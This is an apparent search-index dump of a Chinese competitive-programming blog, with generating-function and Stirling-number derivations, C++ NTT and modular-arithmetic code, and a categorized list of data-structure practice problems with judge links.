k = \\underbrace{(i_1 + i_2+ \\cdots+i_{|S|}) \\times \\cdots \\times (i_1 + i_2+ \\cdots + i_{|S|})}_{ké¡¹} $$ ä¹Ÿå°±æ˜¯åœ¨ $i_1,i_2,\\cdots,i_{|S|}$ ä¸­ä»»é€‰ $k$ ä¸ªå¯é‡å¤çš„æ•°çš„æ‰€æœ‰ä¹˜ç§¯å’Œï¼Œè€ƒè™‘ $A$ ä¸­æ¯ä¸ªæ•° $a_i$ çš„è´¡çŒ®ï¼Œå¯¹äºæ¯ä¸ª $a_i$ éƒ½æœ‰é€‰ä¸ä¸é€‰ä¸¤ç§çŠ¶æ€ï¼Œç»„æˆäº†é›†åˆ $S$ï¼Œé‚£ä¹ˆå‡è®¾ä¸è€ƒè™‘åé¢çš„ $k$ æ¬¡æ–¹å’Œå¼ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºç”Ÿæˆå‡½æ•° $(1 + tx) ^ n$ï¼Œä½†æ˜¯ç°åœ¨å¤šä¹˜äº† $k$ æ¬¡æ–¹å’Œå¼ï¼Œæˆ‘ä»¬å†åªè€ƒè™‘è¿™ä¸ªå’Œå¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸ª $a_i$ éƒ½å¯ä»¥è¢«é€‰ $0 \\sim k$ æ¬¡ï¼Œè€Œä¸”éšæ„æ’åˆ—ï¼Œæ‰€ä»¥ $\\textbf{EGF}$ ä¸º $$ 1 + \\frac{a_i}{1!}x + \\frac{a_i ^ 2}{2!}x ^ 2 + \\cdots + \\frac{a_i ^ k}{k!}x ^ k $$ é‚£ä¹ˆå¯¹äºæŸä¸ªå­é›†çš„è´¡çŒ®å°±ä¸º $$ [x ^ k] \\prod _ {i = 1} ^ n (1 + \\frac{a_i}{1!}x + \\frac{a_i ^ 2}{2!}x ^ 2 + \\cdots + \\frac{a_i ^ k}{k!}x ^ k) $$ æ‰€ä»¥åªéœ€è¦å°†è¿™ä¸¤ä¸ªç”Ÿæˆå‡½æ•°ç»“åˆä¸€ä¸‹ï¼Œä¹Ÿå°±æ˜¯æŠŠè¿™ä¸ª $\\textbf{EGF}$ å¸¦å…¥åˆ°æ¯ä¸ª $1 + tx$ ä¸­ $$ \\prod_{i = 1} ^ {n} \\left (1 + t \\times (1 + \\frac{a_i}{1!}x + \\frac{a_i ^ 2}{2!}x ^ 2 + \\cdots + \\frac{a_i ^ k}{k!}x ^ k) \\right) \\\\ = \\prod _{i = 1} ^ {n}\\left (1 + t + \\frac{t \\times a_i}{1!}x + \\frac{t \\times a_i ^ 2}{2!}x ^ 2 + \\cdots + \\frac{t \\times a_i ^ k}{k!}x ^ k\\right) $$ ç”±äºé¢˜ç›®ä¿è¯äº† $k=0$ æ—¶æ²¡æœ‰å­é›†çš„å’Œæ˜¯ $0$ï¼Œæ‰€ä»¥å¦‚æœ $k = 0$ ç­”æ¡ˆéœ€è¦å‡å» $1$ï¼Œä¹Ÿå°±æ˜¯ç©ºé›†çš„æƒ…å†µã€‚ é‚£ä¹ˆæœ€åçš„ç­”æ¡ˆå°±ä¸º $[x ^ k] \\prod \\limits_{i = 1} ^ {n} (1 + t + \\dfrac{t \\times a_i}{1!}x + \\dfrac{t \\times a_i ^ 2}{2!}x ^ 2 + \\cdots + \\dfrac{t \\times a_i ^ k}{k!}x ^ k) - [k=0]$ æ³¨æ„æ¯æ¬¡ $\\texttt{NTT}$ å·ç§¯éœ€è¦å°†å¤§å°è®¾ä¸º $k$ï¼Œä¸ç„¶ä¼šè¶…æ—¶ã€‚ ","date":"2022-08-22","objectID":"/posts/cp2022ccpc%E5%8D%8E%E4%B8%BA%E4%BA%911005-%E5%B8%A6%E6%9D%83%E5%AD%90%E9%9B%86%E5%92%8C/:0:0","tags":["NTT"],"title":"[2022CCPCåä¸ºäº‘1005] å¸¦æƒå­é›†å’Œ","uri":"/posts/cp2022ccpc%E5%8D%8E%E4%B8%BA%E4%BA%911005-%E5%B8%A6%E6%9D%83%E5%AD%90%E9%9B%86%E5%92%8C/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vector\u003cZ\u003e res(size() - 1); for (int i = 0; i \u003c size","date":"2022-08-22","objectID":"/posts/cp2022ccpc%E5%8D%8E%E4%B8%BA%E4%BA%911005-%E5%B8%A6%E6%9D%83%E5%AD%90%E9%9B%86%E5%92%8C/:1:0","tags":["NTT"],"title":"[2022CCPCåä¸ºäº‘1005] å¸¦æƒå­é›†å’Œ","uri":"/posts/cp2022ccpc%E5%8D%8E%E4%B8%BA%E4%BA%911005-%E5%B8%A6%E6%9D%83%E5%AD%90%E9%9B%86%E5%92%8C/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸‰ä¸ªæ­£æ•´æ•° $n,m,k$ï¼Œæœ‰ $n$ ä¸ªç›’å­ï¼Œæ¯ä¸ªç›’å­æœ‰ $m$ ä¸ªæ ‡å·åˆ†åˆ«ä¸º $1 \\sim m$ çš„çƒï¼Œç°ä»æ¯ä¸ªç›’å­é€‰å‡ºæ°å¥½ä¸€ä¸ªçƒï¼Œå°†å¥‡æ•°ç¼–å·çš„çƒçš„ä¸ªæ•°è®°ä¸º $F$ï¼Œæ±‚æ‰€æœ‰æ–¹æ¡ˆçš„ $F ^ k$ ä¹‹å’Œå¯¹ $998 , 244 , 353$ å–æ¨¡ã€‚ $(1 \\le n, m \\le 998244352, 1 \\le k \\le 2 \\times 10 ^ 3)$ åˆ†æï¼š é¦–å…ˆæ¯ä¸ªç›’å­æœ‰ $\\lceil \\dfrac{m}{2} \\rceil$ ä¸ªå¥‡æ•°çƒå’Œ $\\lfloor \\dfrac{m}{2} \\rfloor$ ä¸ªå¶æ•°çƒï¼Œé‚£ä¹ˆæ‰€æœ‰æ–¹æ¡ˆæ•°ä¸º $m ^ n = (\\lceil \\dfrac{m}{2} \\rceil + \\lfloor \\dfrac{m}{2} \\rfloor) ^ n$ï¼Œæ ¹æ®äºŒé¡¹å¼å®šç†ï¼Œæ‰€ä»¥æ¯ä¸ª $F$ çš„è´¡çŒ®å°±ä¸º $F ^ k \\times \\dbinom{n}{F} \\times \\lceil \\dfrac{m}{2} \\rceil ^ F \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - F}$ æ‰€ä»¥æ€»ç­”æ¡ˆä¸º $$ \\sum_{i = 0} ^ {n} i ^ k \\times \\dbinom{n}{i} \\times \\lceil \\dfrac{m}{2} \\rceil ^ i \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - i} $$ ç”±äº $n \\le 998244352$ï¼Œæ²¡æ³•ç›´æ¥æ±‚ï¼Œä½†æ˜¯çœ‹åˆ° $i ^ k$ æƒ³åˆ°è‡ªç„¶æ•°å¹‚å±•å¼€ $$ i ^ k = \\sum_{j = 0} ^ {k} {k \\brace j} \\times j! \\times \\binom{i}{j} $$ å¸¦å…¥å¾— $$ \\sum_{i = 0} ^ {n} \\dbinom{n}{i} \\times \\lceil \\dfrac{m}{2} \\rceil ^ i \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - i} \\sum_{j = 0} ^ {k} {k \\brace j} \\times j! \\times \\binom{i}{j} $$ å°† $\\dbinom{n}{i}$ æ”¾åˆ°åé¢çš„æ±‚å’Œå·åŒ–ç®€ï¼š$\\dbinom{n}{i} \\times j! \\times \\dbinom{i}{j} = \\dfrac{n!}{i! \\times (n - i)!} \\times j! \\times \\dfrac{i!}{j! \\times (i - j)!} = \\dfrac{n!}{(n - i)! \\times (i - j)!}$ï¼Œé‚£ä¹ˆå¼å­å˜ä¸º $$ \\sum_{i = 0} ^ {n} \\lceil \\dfrac{m}{2} \\rceil ^ i \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - i} \\sum_{j = 0} ^ {k} {k \\brace j} \\times \\dfrac{n!}{(n - i)! \\times (i - j)!} $$ äº¤æ¢æ±‚å’Œæ¬¡åºï¼Œæ³¨æ„ $i$ è¦ä» $j$ å¼€å§‹ï¼Œå› ä¸ºè¦ä¿è¯ $i - j \\ge 0$ $$ \\sum_{j = 0} ^ {k} {k \\brace j} \\sum_{i = j} ^ {n} \\dfrac{n!}{(n - i)! \\times (i - j)!} \\times \\lceil \\dfrac{m}{2} \\rceil ^ i \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - i} $$ å¯¹ç¬¬äºŒä¸ªå’Œå¼åšå˜æ¢ $i - j \\rightarrow i$ $$ \\sum_{j = 0} ^ {k} {k \\brace j} \\sum_{i = 0} ^ {n - j} \\dfrac{n!}{(n - i - j)! \\times i!} \\times \\lceil \\dfrac{m}{2} \\rceil ^ {i + j} \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - i - j} $$ åˆ°è¿™é‡Œå‘ç°ç¬¬äºŒä¸ªå’Œå¼æ¯”è¾ƒåƒäºŒé¡¹å¼å±•å¼€äº†ï¼Œå³ $(a + b) ^ n = \\sum\\limits_{i = 0} ^ {n} \\dbinom{n}{i} a ^ {i} b ^ {n - i}$ï¼Œé‚£ä¹ˆè€ƒè™‘å¾€è¿™ä¸ªæ–¹å‘å‡‘å¼å­ï¼Œé¦–å…ˆè¦è§£å†³çš„æ˜¯ç»„åˆæ•°ï¼Œå‘ç°ç¬¬äºŒä¸ªå’Œå¼ä¸Šç•Œä¸º $n - j$ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦å‡‘ä¸€ä¸ª $\\dbinom{n - j}{i} = \\dfrac{(n - j)!}{(n - i - j) \\times i!}$ çš„ç»„åˆæ•°ï¼Œå‘ç°æ°å¥½å¤šäº† $n \\times(n - 1) \\times \\cdots \\times (n - j + 1) = n ^ {\\underline j}$ï¼Œé‚£ä¹ˆåé¢ä¹Ÿå¤šäº† $\\lceil \\dfrac{m}{2} \\rceil ^ {j}$ï¼Œæå‡ºæ¥ä¹‹åä¸º $$ \\sum_{j = 0} ^ {k} {k \\brace j} \\times n ^ {\\underline j} \\times \\lceil \\dfrac{m}{2} \\rceil ^ {j} \\sum_{i = 0} ^ {n - j} \\binom{n - j}{i} \\times \\lceil \\dfrac{m}{2} \\rceil ^ {i} \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - i - j} $$ ç”±äºŒé¡¹å¼å®šç†å¾— $\\sum\\limits_{i = 0} ^ {n - j} \\dbinom{n - j}{i} \\times \\lceil \\dfrac{m}{2} \\rceil ^ {i} \\times \\lfloor \\dfrac{m}{2} \\rfloor ^ {n - i - j} = (\\lceil \\dfrac{m}{2} \\rceil + \\lfloor \\dfrac{m}{2} \\rfloor) ^ {n - j} = m ^ {n - j}$ï¼Œé‚£ä¹ˆç­”æ¡ˆä¸º $$ \\sum_{j = 0} ^ {k} {k \\brace j} \\times n ^ {\\underline j} \\times \\lceil \\dfrac{m}{2} \\rceil ^ {j} \\times m ^ {n - j} $$ æ‰€ä»¥åªéœ€è¦é¢„å¤„ç† $2 \\times 10 ^ 3$ ä»¥å†…çš„ç¬¬äºŒç±»æ–¯ç‰¹æ—æ•°ï¼Œå† $O(k)$ ç»´æŠ¤ä¸‹é™å¹‚å³å¯ã€‚ ","date":"2022-08-05","objectID":"/posts/cpeducational-codeforces-round-133-f-bags-with-balls/:0:0","tags":["ç»„åˆè®¡æ•°","æ¨å¼å­"],"title":"[Educational Codeforces Round 133 F] Bags with Balls","uri":"/posts/cpeducational-codeforces-round-133-f-bags-with-balls/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353, N = 2e3; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cvector\u003cZ\u003e\u003e stirling(N + 1, vector\u003cZ\u003e(N + 1)); void init() { stirling[0][0] = 1; for (int i = 1; i \u003c= N; i ++) { for (int j = 1; j \u003c= i; j ++) { stirling[i][j] = stirling[i - 1][j - 1] + j * stirling[i - 1][j]; } } } void solve() { int n, m, k; cin \u003e\u003e n \u003e\u003e m \u003e\u003e k; Z res, sum = 1; for (int i = 0, cnt = n; i \u003c= k; i ++, cnt --) { res += stirling[k][i] * power(Z((m + 1) / 2), i) * power(Z(m), n - i) * sum; sum *= cnt; } cout \u003c\u003c res \u003c\u003c \"\\n\"; } signed main() { init(); cin.tie(0) -\u003e sync_with_stdio(0); int T; cin \u003e\u003e T; while (T --) { solve(); } } ","date":"2022-08-05","objectID":"/posts/cpeducational-codeforces-round-133-f-bags-with-balls/:1:0","tags":["ç»„åˆè®¡æ•°","æ¨å¼å­"],"title":"[Educational Codeforces Round 133 F] Bags with Balls","uri":"/posts/cpeducational-codeforces-round-133-f-bags-with-balls/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"çº¿æ®µæ ‘ åŒºé—´å¼‚æˆ– https://www.luogu.com.cn/problem/CF242E åŒºé—´å–æ¨¡ https://www.luogu.com.cn/problem/CF438D åŒºé—´å¼€æ ¹ https://www.luogu.com.cn/problem/SP2713 åŒºé—´çº¦æ•°ä¸ªæ•° https://www.luogu.com.cn/problem/CF920F åŒºé—´åè½¬ $0$ å˜ $1$ $1$ å˜ $0$ https://www.luogu.com.cn/problem/P2574 åŒºé—´ $\\text{lowbit}$ https://codeforces.com/gym/103145/problem/D åŒºé—´ä¹˜ åŒºé—´æ¬§æ‹‰å‡½æ•°å’Œ $\\text{ICPC}$ ç½‘ç»œèµ›ç¬¬äºŒåœº $\\text{L}$ é¢˜ åŒºé—´å¤šé‡é›†åŠ  åŒºé—´ä¸‰è§’å½¢ https://ac.nowcoder.com/acm/problem/228151 åŒºé—´åœ†ç›˜ åŠ¨æ€å¼€ç‚¹ https://codeforces.com/gym/101630 Aé¢˜ åŒºé—´åŠ ç­‰å·®æ•°åˆ— https://www.luogu.com.cn/problem/P1438 åŒºé—´åŠ ã€åŒºé—´ä¹˜ https://www.luogu.com.cn/problem/P2023 åŒºé—´æ›¿æ¢ åŠ¨æ€å¼€ç‚¹ https://www.luogu.com.cn/problem/CF911G åŒºé—´åˆæ³•æ‹¬å·åºåˆ— https://atcoder.jp/contests/abc223/tasks/abc223_f åŒºé—´ä¹˜ åŒºé—´æ¬§æ‹‰å‡½æ•° https://www.luogu.com.cn/problem/CF1114F åŒºé—´åŠ æ–æ³¢é‚£å¥‘æ•°åˆ— åŒºé—´å’Œ https://www.luogu.com.cn/problem/CF446C åŒºé—´åŠ  åŒºé—´ $\\sin$ å’Œ https://www.luogu.com.cn/problem/P6327 åŒºé—´èµ‹å€¼ åŒºé—´åŠ  åŒºé—´æœ€å¤§å€¼ https://www.luogu.com.cn/problem/P1253 åŒºé—´é¢œè‰²ä¿®æ”¹ åŒºé—´åŠ  å•ç‚¹æŸ¥è¯¢ https://codeforces.com/problemset/problem/1638/E åŒºé—´ä¸‹å–æ•´ åŒºé—´èµ‹å€¼ åŒºé—´å’Œ https://atcoder.jp/contests/abc256/tasks/abc256_h åŒºé—´æœ€å¤§å€¼ å·ç§¯ https://codeforces.com/gym/102822/problem/J åŒºé—´åŠ  åŒºé—´æœ€å¤§å€¼ ç¦»æ•£åŒ– å·®åˆ† A https://codeforces.com/gym/101987/ åŒºé—´ $01$ èµ‹å€¼ åŒºé—´ç¿»è½¬ åŒºé—´è¯¢é—®å€¼ä¸º $0$ çš„æœ€å°å·¦ç«¯ç‚¹ https://codeforces.com/contest/817/problem/F åŒºé—´ç¾ä¸½ä¸‰å…ƒç»„çš„ä¸ªæ•° https://codeforces.com/contest/1701/problem/F åŒºé—´ç¿»è½¬ åŒºé—´æ‰¾ 0 1 https://codeforces.com/contest/1705/problem/E åŒºé—´å¥‡æ•°é™¤ 2 å¶æ•°ä¹˜ 2 https://ac.nowcoder.com/acm/contest/37344/K ","date":"2022-08-04","objectID":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/:1:0","tags":["é¢˜å•","æ•°æ®ç»“æ„"],"title":"æ•°æ®ç»“æ„é¢˜å•","uri":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ ‘çŠ¶æ•°ç»„ åŒºé—´ä¸åŒé¢œè‰²ä¸ªæ•° https://www.acwing.com/problem/content/2494/ åŒºé—´ä¹˜ç§¯çš„æ¬§æ‹‰å‡½æ•° https://www.luogu.com.cn/problem/CF594D $1 \\sim n$ æœ‰å¤šå°‘å¯ä»¥è¡¨ç¤ºä¸ºå¤§äºç­‰äº $k$ çš„è´¨æ•°ä¹˜ç§¯çš„æ•° è½¬ä¸ºäºŒç»´ååº https://ac.nowcoder.com/acm/problem/228989 åŒºé—´ä¸å¤§äºæŸä¸ªæ•°çš„ä¸ªæ•° http://oj.daimayuan.top/course/10/problem/464 äºŒç»´æ•°ç‚¹ http://oj.daimayuan.top/course/15/problem/686 ","date":"2022-08-04","objectID":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/:2:0","tags":["é¢˜å•","æ•°æ®ç»“æ„"],"title":"æ•°æ®ç»“æ„é¢˜å•","uri":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ ‘é“¾å‰–åˆ† é…åˆæƒå€¼çº¿æ®µæ ‘ https://www.acwing.com/problem/content/description/355/ é…åˆåŠ¨æ€å¼€ç‚¹çš„æƒå€¼çº¿æ®µæ ‘ https://www.acwing.com/problem/content/description/1282/ é…åˆå·®åˆ† https://www.acwing.com/problem/content/356/ æ ‘ä¸Šè·¯å¾„è¾¹æƒå˜ä¸ºç›¸åæ•° https://www.luogu.com.cn/problem/P1505 æ¢æ ¹æ ‘é“¾å‰–åˆ†æ¨¡æ¿é¢˜ https://www.acwing.com/problem/content/2526/ æ¢æ ¹æ ‘é“¾å‰–åˆ† å­æ ‘æœ€å°å€¼ https://www.luogu.com.cn/problem/P3979 æ¨å…¬å¼ ç¦»çº¿å·®åˆ† https://www.luogu.com.cn/problem/P4211 æ¢æ ¹ ä¿®æ”¹å¸¦ $\\text{lca}$ https://www.luogu.com.cn/problem/CF916E å­æ ‘è¿­ä»£åŠ ç›¸åæ•° https://www.luogu.com.cn/problem/CF383C éå¸¸å¦™çš„ LCT è½¬æ ‘å‰– https://www.luogu.com.cn/problem/P3950 è¾¹æƒä¿®æ”¹ æ‰€æœ‰å­è·¯å¾„å¼‚æˆ–å’Œ https://www.luogu.com.cn/problem/P3401 ç¦»çº¿ç”Ÿæˆæ ‘ æ ‘é“¾å‰–åˆ† https://www.luogu.com.cn/problem/P2542 æ ‘ä¸Šæ‰€æœ‰è·¯å¾„çš„äº¤ç‚¹ F https://codeforces.com/gym/102040 æ ‘ä¸Šè·¯å¾„ç›¸é‚»é¢œè‰²ä¸åŒ G https://codeforces.com/gym/101617 å­æ ‘å†…æŸä¸ªæ•°å‡ºç°æ¬¡æ•° https://atcoder.jp/contests/abc202/tasks/abc202_e ","date":"2022-08-04","objectID":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/:3:0","tags":["é¢˜å•","æ•°æ®ç»“æ„"],"title":"æ•°æ®ç»“æ„é¢˜å•","uri":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä¸»å¸­æ ‘ ç¬¬ $K$ å°æ•° https://www.acwing.com/problem/content/257/ åŒºé—´æŸä¸ªæ•°å‡ºç°æ¬¡æ•° https://acm.sdut.edu.cn/onlinejudge3/problems/4854 åŒºé—´æœ€å°ä¸èƒ½è¢«è¡¨ç¤ºçš„æ•° https://ac.nowcoder.com/acm/contest/12548/M åŒºé—´æœ€å°ä¸èƒ½è¢«è¡¨ç¤ºçš„æ•° å¸¦ä¿® æ ‘çŠ¶æ•°ç»„å¥—ä¸»å¸­æ ‘ https://nanti.jisuanke.com/t/42547 åŒºé—´ $\\text{mex}$ https://www.luogu.com.cn/problem/P4137 ","date":"2022-08-04","objectID":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/:4:0","tags":["é¢˜å•","æ•°æ®ç»“æ„"],"title":"æ•°æ®ç»“æ„é¢˜å•","uri":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ ‘ä¸Šé—®é¢˜ å­æ ‘æ•°é¢œè‰² æ ‘ä¸Šå¯å‘å¼åˆå¹¶ https://codeforces.com/contest/600/problem/E å­æ ‘ç›¸é‚»å…ƒç´ ä¸ªæ•° æ ‘ä¸Šå¯å‘å¼åˆå¹¶ https://codeforces.com/gym/102431/problem/K æ ‘çš„é‡å¿ƒæ€§è´¨ https://nanti.jisuanke.com/t/42552 æ‰€æœ‰å¼‚æˆ–è·¯å¾„ä¸ä¸º 0 å¯å‘å¼åˆå¹¶ https://codeforces.com/contest/1709/problem/E ","date":"2022-08-04","objectID":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/:5:0","tags":["é¢˜å•","æ•°æ®ç»“æ„"],"title":"æ•°æ®ç»“æ„é¢˜å•","uri":"/posts/cp%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E9%A2%98%E5%8D%95/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®šä¸€ä¸ªé•¿åº¦ä¸º $n$ çš„æ’åˆ— $p$ ${1, 2, \\cdots, n}$ å’Œä¸€ä¸ªéè´Ÿæ•´æ•° $k$ï¼Œè®¡ç®—æ’åˆ— $p$ ä¸­çš„å­é›† $T$ï¼Œæ»¡è¶³é›†åˆå¤§å°ä¸º $k$ ä¸” $T$ ä¸ $P(T)$ æ²¡æœ‰äº¤é›†ï¼Œ$P(T) = {y \\mid y= p_x,x \\in T}$ åˆ†æï¼š è€ƒè™‘å°†æ’åˆ— $p$ çœ‹æˆå›¾ï¼Œ$i$ å‘ $p_i$ è¿è¾¹ï¼Œä¼šå½¢æˆè‹¥å¹²ä¸ªç¯ï¼Œé‚£ä¹ˆåŸé—®é¢˜ç­‰ä»·äºä»å›¾ä¸­é€‰å‡º $k$ ä¸ªç‚¹ä¸”æ¯ä¸ªç¯ä¸­ä¸èƒ½æœ‰ç›¸é‚»è¢«é€‰æ‹©çš„ç‚¹çš„æ–¹æ¡ˆæ•°ã€‚è€ƒè™‘æ„é€ æ¯ä¸ªç¯ $i$ çš„ç”Ÿæˆå‡½æ•° $$ 1 + f_{S_i,1}x + f_{S_i,2} x ^ 2 + \\cdots + f_{S_i,\\lfloor \\frac{S_i}{2} \\rfloor} x ^ {\\lfloor \\frac{S_i}{2} \\rfloor} $$ å…¶ä¸­ $S_i$ è¡¨ç¤ºç¯ $i$ çš„å¤§å°ï¼Œ$f_{S_i,j}$ è¡¨ç¤ºå¤§å°ä¸º $S_i$ çš„ç¯ä¸­é€‰å‡º $j$ ä¸ªäº’ä¸ç›¸é‚»çš„ç‚¹çš„æ–¹æ¡ˆæ•°ï¼Œæ ¹æ®é¸½å·¢åŸç†ï¼Œè‹¥ $j \u003e \\lfloor \\dfrac{S_i}{2} \\rfloor$ï¼Œä¸€å®šæœ‰ä¸¤ä¸ªç‚¹ç›¸é‚»ï¼Œæ‰€ä»¥ç”Ÿæˆå‡½æ•°åªéœ€è¦å–åˆ° $\\lfloor \\dfrac{S_i}{2} \\rfloor$ 